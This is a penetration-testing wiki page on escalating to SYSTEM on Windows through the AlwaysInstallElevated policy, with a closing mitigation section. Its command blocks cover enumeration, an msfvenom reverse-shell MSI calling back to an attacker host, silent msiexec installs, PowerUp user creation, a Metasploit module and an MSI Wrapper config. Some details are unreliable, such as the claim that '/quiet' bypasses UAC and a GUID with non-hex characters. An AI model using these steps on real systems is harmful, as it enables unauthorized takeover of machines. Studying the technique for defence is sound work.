# AlwaysInstallElevated

Windows features that allow us to install `.msi` packages as **administrators** (more precisely as **NT AUTHORITY\SYSTEM**).

## Theory

MSI files are package files used to install applications. These files are executed with the permissions of the user attempting to install them. Windows allows these installers to run with elevated (i.e., administrator) privileges. If this is the case, we can generate a malicious MSI file containing a reverse shell. The problem is that there are two registry settings that must be enabled for this to work.

## Practice

### Verification

{% tabs %}
{% tab title="Manual" %}
The value of "AlwaysInstallElevated" must be set to 1 for both the local machine.

* "0x1" means 1.
* "0x0" means 0.

```shell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer # Debe tener 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer # Debe tener 1
```

If any of them is missing or disabled, the exploit will not work.
{% endtab %}

{% tab title="Automatic" %}
### winPEAS

```shell
winPEAS.exe quiet systeminfo
```

![](../../../../.gitbook/assets/alwaysinstallelevated\_winpeas.png)

### PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

![](../../../../.gitbook/assets/alwaysinstallelevated\_powerup.png)

If the "Checking for AlwaysInstallElevated" part tells us that we can abuse the "Write-UserAddMSI" function, then we can escalate privileges.
{% endtab %}
{% endtabs %}

### Privilege Escalation

{% tabs %}
{% tab title="msfvenom" %}
We generate a reverse shell of type msi with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o reverse.msi
```

After uploading the .msi to the compromised machine and listening for the port on which we will receive our reverse shell, we have to install the package:

```shell
msiexec /quiet /qn /i <PATH>\reverse.msi
msiexec /norestart /quiet /qn /i <PATH>\reverse.msi 
```

Flags:

* `/quiet` will bypass User Account Control (UAC).
* `/qn` specifies not to use a GUI.
* `/i` is to perform a regular installation of the package.
{% endtab %}

{% tab title="PowerUp" %}
{% hint style="danger" %}
With PowerUp, we need to have an RDP session.
{% endhint %}

We import the PowerUp module and then run the Write-UserAddMSI function to generate a `.msi` file that allows us to create a user:

```powershell
powershell -ep bypass
. .\PowerUp.ps1

Write-UserAddMSI
```

The previous command will create an executable that is configured with graphical interface. We run it, configure the user, password and the Administrators group.

![](../../../../.gitbook/assets/alwaysinstallelevated\_powerup\_msi.png)
{% endtab %}

{% tab title="Metasploit" %}
```shell
background
use exploit/windows/local/always_install_elevated
set SESSION <SESSION_NUM>
run
```
{% endtab %}

{% tab title="Manual" %}
We can use the [MSI Wrapper](https://www.exemsi.com) tool.

This program will convert executable installers (.exe) into MSI packages. So, we will have to create a malicious binary, then use the program to convert it into an MSI package and, finally, install it.

### Practice

The first thing we have to do is to generate a malicious binary.

Then, we are going to have to edit the configuration for the MSI Wrapper, which is as follows:

```xml
<MsiWrapper>
  <Installer>
    <IconFile Detect="executable" Value="" />
    <Output FileName="<OUTPUT_PATH>\shell.msi" />
    <InstallPrivileges Value="Elevated" />
    <PerUser Value="yes" />
    <ElevateExecutable Value="always" />
    <UpgradeCode Value="{SSB51239-4A44-2760-3621-63CE643S42E0}" />
    <ProductId Value="" />
    <Registration Value="None" />
    <Manufacturer Detect="" Value="Test Company" />
    <ProductVersion Detect="executable" Value="0.0.0.1" />
    <ProductName Detect="" Value="Test" />
    <Comments Detect="executable" Value="" />
    <Contact Detect="" Value="" />
    <HelpLink Detect="" Value="" />
    <UpdateLink Detect="" Value="" />
    <AboutLink Detect="" Value="" />
  </Installer>
  <WrappedInstaller>
    <Executable FileName="<PATH>\<BINARY>.exe" SuccessCodes="" Impersonate="no" IncludeFiles="no" CompressionLevel="Max" />
    <ApplicationId Value="" />
    <Install>
      <Arguments Value="">
        <UILevelNone Value="" />
        <UILevelBasic Value="" />
        <UILevelReduced Value="" />
        <UILevelFull Value="" />
      </Arguments>
      <RunBeforeInstall Value="" />
      <RunAfterInstall Value="" />
    </Install>
    <Uninstall>
      <Arguments Value="">
        <UILevelNone Value="" />
        <UILevelBasic Value="" />
        <UILevelReduced Value="" />
        <UILevelFull Value="" />
      </Arguments>
    </Uninstall>
  </WrappedInstaller>
</MsiWrapper>
```

When we finish editing, we will open the program and load the configuration:

![](<../../../../.gitbook/assets/msi\_wrapper\_load\_settings (1).png>)

As we already loaded the configuration, we can click on "Next" until the end, where we will build the .msi:

![](../../../../.gitbook/assets/msi\_wrapper\_build.png)

Finally, we transfer the MSI package and install it:

```shell
msiexec /quiet /qn /i <PATH>\reverse.msi
msiexec /norestart /quiet /qn /i <PATH>\reverse.msi 
```
{% endtab %}
{% endtabs %}

### Mitigation

This problem can be mitigated by disabling the two Local Group Policy settings by removing the **Always install with elevated privileges** option from the following paths:

* Computer Configuration\Administrative Templates\Windows Components\Windows Installer
* User Configuration\Administrative Templates\Windows Components\Windows Installer

![](../../../../.gitbook/assets/alwaysinstallelevated\_mitigation.png)
